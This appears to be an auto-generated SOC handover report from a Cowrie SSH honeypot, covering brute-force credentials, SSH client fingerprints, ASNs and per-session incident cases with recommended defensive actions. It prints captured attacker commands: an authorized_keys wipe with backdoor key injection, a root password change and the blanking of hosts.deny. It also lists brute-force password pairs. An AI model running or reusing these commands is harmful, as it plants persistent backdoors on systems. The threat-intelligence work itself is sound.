# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-10 |
| **Generated At** | 2026-06-10T15:44:07Z |
| **Shift Time** | 15:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **528** |
| Confirmed Threats | **508** |
| False Positives Filtered | **20** (3.8%) |
| Unique Attacker IPs | **63** |
| Countries of Origin | **20** |
| High Severity Cases | **85** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **443** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **204** |
| Unique Credential Pairs | **144** |
| Unique Usernames | **61** |
| Unique Passwords | **117** |
| Successful Auth Pairs | **66** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 88 |
| `345gs5662d34` | 26 |
| `admin` | 14 |
| `test` | 6 |
| `ubuntu` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 27 |
| `345gs5662d34` | 26 |
| `123456` | 9 |
| `admin` | 7 |
| `12345678` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 27 |
| `345gs5662d34` | `345gs5662d34` | 26 |
| `admin` | `admin` | 3 |
| `root` | `root` | 2 |
| `root` | `admin` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Hh@123456` | `196.189.237.172` | 2026-06-10T10:13:27 |
| `root` | `3245gs5662d34` | `196.189.237.172` | 2026-06-10T10:13:34 |
| `root` | `angelo123` | `149.34.253.149` | 2026-06-10T10:21:43 |
| `root` | `3245gs5662d34` | `149.34.253.149` | 2026-06-10T10:21:46 |
| `root` | `Qwerty#2024` | `196.189.237.172` | 2026-06-10T10:23:20 |
| `root` | `Qwerty@1234` | `196.189.237.172` | 2026-06-10T10:25:37 |
| `root` | `qQ123456789` | `196.189.237.172` | 2026-06-10T10:29:38 |
| `root` | `Computer123` | `196.189.237.172` | 2026-06-10T10:31:35 |
| `root` | `` | `176.65.139.254` | 2026-06-10T10:32:48 |
| `root` | `admin` | `176.65.139.254` | 2026-06-10T10:32:54 |
| `root` | `password` | `176.65.139.254` | 2026-06-10T10:32:58 |
| `root` | `1234` | `176.65.139.254` | 2026-06-10T10:33:01 |
| `root` | `toor` | `176.65.139.254` | 2026-06-10T10:33:04 |
| `root` | `12345` | `176.65.139.254` | 2026-06-10T10:33:12 |
| `root` | `default` | `176.65.139.254` | 2026-06-10T10:33:15 |
| `root` | `redhat` | `176.65.139.254` | 2026-06-10T10:33:20 |
| `root` | `1qaz@wsx` | `176.65.139.254` | 2026-06-10T10:33:23 |
| `root` | `vizxv` | `176.65.139.254` | 2026-06-10T10:33:25 |
| `root` | `123456789` | `176.65.139.254` | 2026-06-10T10:33:28 |
| `root` | `qwerty` | `176.65.139.254` | 2026-06-10T10:33:30 |
| `root` | `12345678` | `176.65.139.254` | 2026-06-10T10:33:33 |
| `root` | `111111` | `176.65.139.254` | 2026-06-10T10:33:36 |
| `root` | `1234567` | `176.65.139.254` | 2026-06-10T10:33:39 |
| `root` | `P@ssword12345` | `196.189.237.172` | 2026-06-10T10:33:39 |
| `root` | `1234567890` | `176.65.139.254` | 2026-06-10T10:33:41 |
| `root` | `abc123` | `176.65.139.254` | 2026-06-10T10:33:44 |
| `root` | `123123` | `176.65.139.254` | 2026-06-10T10:33:46 |
| `root` | `password1` | `176.65.139.254` | 2026-06-10T10:33:49 |
| `root` | `000000` | `176.65.139.254` | 2026-06-10T10:33:51 |
| `root` | `iloveyou` | `176.65.139.254` | 2026-06-10T10:33:53 |
| `root` | `qwertyuiop` | `176.65.139.254` | 2026-06-10T10:33:56 |
| `root` | `123321` | `176.65.139.254` | 2026-06-10T10:33:59 |
| `root` | `654321` | `176.65.139.254` | 2026-06-10T10:34:01 |
| `root` | `666666` | `176.65.139.254` | 2026-06-10T10:34:04 |
| `root` | `123456a` | `176.65.139.254` | 2026-06-10T10:34:07 |
| `root` | `Admin321` | `196.189.237.172` | 2026-06-10T10:35:36 |
| `root` | `Lc123456.` | `196.189.237.172` | 2026-06-10T10:45:31 |
| `root` | `qwert@12345` | `115.190.197.138` | 2026-06-10T10:54:24 |
| `root` | `Password@_` | `95.167.225.76` | 2026-06-10T11:10:43 |
| `root` | `3245gs5662d34` | `95.167.225.76` | 2026-06-10T11:10:48 |
| `root` | `qwer@2026` | `95.167.225.76` | 2026-06-10T11:13:43 |
| `root` | `ff123456` | `95.167.225.76` | 2026-06-10T11:21:18 |
| `root` | `Vps2026` | `95.167.225.76` | 2026-06-10T11:30:18 |
| `root` | `p@ck3tf3nc3` | `95.167.225.76` | 2026-06-10T11:34:56 |
| `root` | `sofresh` | `95.167.225.76` | 2026-06-10T11:36:37 |
| `root` | `@dm1n2025` | `95.167.225.76` | 2026-06-10T11:44:16 |
| `root` | `admin` | `78.68.65.91` | 2026-06-10T12:31:05 |
| `root` | `Yh123456` | `118.196.43.125` | 2026-06-10T13:11:42 |
| `root` | `Apple@2024` | `170.238.160.191` | 2026-06-10T13:26:44 |
| `root` | `3245gs5662d34` | `170.238.160.191` | 2026-06-10T13:27:29 |
| `root` | `!QAZ2wsx2026` | `120.48.154.88` | 2026-06-10T13:28:24 |
| `root` | `3245gs5662d34` | `120.48.154.88` | 2026-06-10T13:28:32 |
| `root` | `a123321.` | `103.91.246.101` | 2026-06-10T13:30:16 |
| `root` | `3245gs5662d34` | `103.91.246.101` | 2026-06-10T13:30:18 |
| `root` | `QQQ123456` | `101.42.41.164` | 2026-06-10T13:34:56 |
| `root` | `3245gs5662d34` | `101.42.41.164` | 2026-06-10T13:35:00 |
| `root` | `112358` | `118.145.237.236` | 2026-06-10T13:38:51 |
| `root` | `Adm123` | `171.25.158.57` | 2026-06-10T13:41:51 |
| `root` | `3245gs5662d34` | `171.25.158.57` | 2026-06-10T13:41:55 |
| `root` | `QQQ123456` | `171.25.158.57` | 2026-06-10T13:47:19 |
| `root` | `23232323` | `171.25.158.57` | 2026-06-10T13:49:09 |
| `root` | `zaq1XSW@` | `171.25.158.57` | 2026-06-10T14:07:37 |
| `root` | `q1w2e3r4t5y6u7i8` | `171.25.158.57` | 2026-06-10T14:09:33 |
| `root` | `asd@123456` | `171.25.158.57` | 2026-06-10T14:11:24 |
| `root` | `12345678.` | `171.25.158.57` | 2026-06-10T14:14:58 |
| `root` | `234` | `62.201.253.23` | 2026-06-10T14:50:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **528** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 161 |
| Go SSH scanner | 53 |
| OpenSSH | 5 |
| Perl Net::SSH | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 137 | 9 |
| `16443846184e...` | Generic scanner | 51 | 1 |
| `03a80b21afa8...` | Modern SSH client | 18 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 5 | 5 |
| `3c0eaacec19b...` | Mirai/variant | 3 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 137 | 9 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 51 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 18 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 5 | — |
| `acaa53e0a7d7...` | OpenSSH | 5 | 5 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 3 | 3 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 27 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:3nPPFr1YIRFA"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.196.43.125`, `118.145.237.236`, `115.190.197.138`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `171.25.158.57`, `196.189.237.172`, `103.91.246.101`, `120.48.154.88`, `149.34.253.149`, `95.167.225.76`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **63** |
| Unique ASNs | **39** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 9 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (85)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-035818d83780

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:13 |
| **Last Seen** | 2026-06-10 10:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:13:26` | `cowrie.session.connect` |
| `2026-06-10 10:13:26` | `cowrie.client.version` |
| `2026-06-10 10:13:26` | `cowrie.client.kex` |
| `2026-06-10 10:13:27` | `cowrie.login.success` |
| `2026-06-10 10:13:27` | `cowrie.session.params` |
| `2026-06-10 10:13:27` | `cowrie.command.input` |
| `2026-06-10 10:13:27` | `cowrie.command.failed` |
| `2026-06-10 10:13:28` | `cowrie.log.closed` |
| `2026-06-10 10:13:28` | `cowrie.session.params` |
| `2026-06-10 10:13:28` | `cowrie.command.input` |
| `2026-06-10 10:13:28` | `cowrie.session.file_download` |
| `2026-06-10 10:13:28` | `cowrie.log.closed` |
| `2026-06-10 10:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770ba0d5cb01

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:13 |
| **Last Seen** | 2026-06-10 10:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:13:33` | `cowrie.session.connect` |
| `2026-06-10 10:13:33` | `cowrie.client.version` |
| `2026-06-10 10:13:34` | `cowrie.client.kex` |
| `2026-06-10 10:13:34` | `cowrie.login.success` |
| `2026-06-10 10:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e12c78b341f

| Field | Detail |
|---|---|
| **Source IP** | `149.34.253[.]149` |
| **First Seen** | 2026-06-10 10:21 |
| **Last Seen** | 2026-06-10 10:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:21:43` | `cowrie.session.connect` |
| `2026-06-10 10:21:43` | `cowrie.client.version` |
| `2026-06-10 10:21:43` | `cowrie.client.kex` |
| `2026-06-10 10:21:43` | `cowrie.login.success` |
| `2026-06-10 10:21:43` | `cowrie.session.params` |
| `2026-06-10 10:21:43` | `cowrie.command.input` |
| `2026-06-10 10:21:43` | `cowrie.command.failed` |
| `2026-06-10 10:21:44` | `cowrie.log.closed` |
| `2026-06-10 10:21:44` | `cowrie.session.params` |
| `2026-06-10 10:21:44` | `cowrie.command.input` |
| `2026-06-10 10:21:44` | `cowrie.session.file_download` |
| `2026-06-10 10:21:44` | `cowrie.log.closed` |
| `2026-06-10 10:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.34.253[.]149` to AbuseIPDB if not already reported
- [ ] Block `149.34.253[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1c8cd879a5

| Field | Detail |
|---|---|
| **Source IP** | `149.34.253[.]149` |
| **First Seen** | 2026-06-10 10:21 |
| **Last Seen** | 2026-06-10 10:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:21:46` | `cowrie.session.connect` |
| `2026-06-10 10:21:46` | `cowrie.client.version` |
| `2026-06-10 10:21:46` | `cowrie.client.kex` |
| `2026-06-10 10:21:46` | `cowrie.login.success` |
| `2026-06-10 10:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.34.253[.]149` to AbuseIPDB if not already reported
- [ ] Block `149.34.253[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b6ace24f9e

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:23 |
| **Last Seen** | 2026-06-10 10:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:23:19` | `cowrie.session.connect` |
| `2026-06-10 10:23:19` | `cowrie.client.version` |
| `2026-06-10 10:23:19` | `cowrie.client.kex` |
| `2026-06-10 10:23:20` | `cowrie.login.success` |
| `2026-06-10 10:23:20` | `cowrie.session.params` |
| `2026-06-10 10:23:20` | `cowrie.command.input` |
| `2026-06-10 10:23:20` | `cowrie.command.failed` |
| `2026-06-10 10:23:20` | `cowrie.log.closed` |
| `2026-06-10 10:23:21` | `cowrie.session.params` |
| `2026-06-10 10:23:21` | `cowrie.command.input` |
| `2026-06-10 10:23:21` | `cowrie.session.file_download` |
| `2026-06-10 10:23:21` | `cowrie.log.closed` |
| `2026-06-10 10:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e427ae1e78b8

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:23 |
| **Last Seen** | 2026-06-10 10:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:23:23` | `cowrie.session.connect` |
| `2026-06-10 10:23:23` | `cowrie.client.version` |
| `2026-06-10 10:23:23` | `cowrie.client.kex` |
| `2026-06-10 10:23:24` | `cowrie.login.success` |
| `2026-06-10 10:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf9d68b393d

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:25 |
| **Last Seen** | 2026-06-10 10:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:25:36` | `cowrie.session.connect` |
| `2026-06-10 10:25:36` | `cowrie.client.version` |
| `2026-06-10 10:25:36` | `cowrie.client.kex` |
| `2026-06-10 10:25:37` | `cowrie.login.success` |
| `2026-06-10 10:25:37` | `cowrie.session.params` |
| `2026-06-10 10:25:37` | `cowrie.command.input` |
| `2026-06-10 10:25:37` | `cowrie.command.failed` |
| `2026-06-10 10:25:38` | `cowrie.log.closed` |
| `2026-06-10 10:25:38` | `cowrie.session.params` |
| `2026-06-10 10:25:38` | `cowrie.command.input` |
| `2026-06-10 10:25:38` | `cowrie.session.file_download` |
| `2026-06-10 10:25:38` | `cowrie.log.closed` |
| `2026-06-10 10:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6d0079f2da5

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:25 |
| **Last Seen** | 2026-06-10 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:25:41` | `cowrie.session.connect` |
| `2026-06-10 10:25:41` | `cowrie.client.version` |
| `2026-06-10 10:25:41` | `cowrie.client.kex` |
| `2026-06-10 10:25:42` | `cowrie.login.success` |
| `2026-06-10 10:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03cbbae867c0

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:29 |
| **Last Seen** | 2026-06-10 10:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:29:37` | `cowrie.session.connect` |
| `2026-06-10 10:29:37` | `cowrie.client.version` |
| `2026-06-10 10:29:37` | `cowrie.client.kex` |
| `2026-06-10 10:29:38` | `cowrie.login.success` |
| `2026-06-10 10:29:38` | `cowrie.session.params` |
| `2026-06-10 10:29:38` | `cowrie.command.input` |
| `2026-06-10 10:29:38` | `cowrie.command.failed` |
| `2026-06-10 10:29:38` | `cowrie.log.closed` |
| `2026-06-10 10:29:39` | `cowrie.session.params` |
| `2026-06-10 10:29:39` | `cowrie.command.input` |
| `2026-06-10 10:29:39` | `cowrie.session.file_download` |
| `2026-06-10 10:29:39` | `cowrie.log.closed` |
| `2026-06-10 10:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45b302f279ec

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:29 |
| **Last Seen** | 2026-06-10 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:29:41` | `cowrie.session.connect` |
| `2026-06-10 10:29:41` | `cowrie.client.version` |
| `2026-06-10 10:29:41` | `cowrie.client.kex` |
| `2026-06-10 10:29:42` | `cowrie.login.success` |
| `2026-06-10 10:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
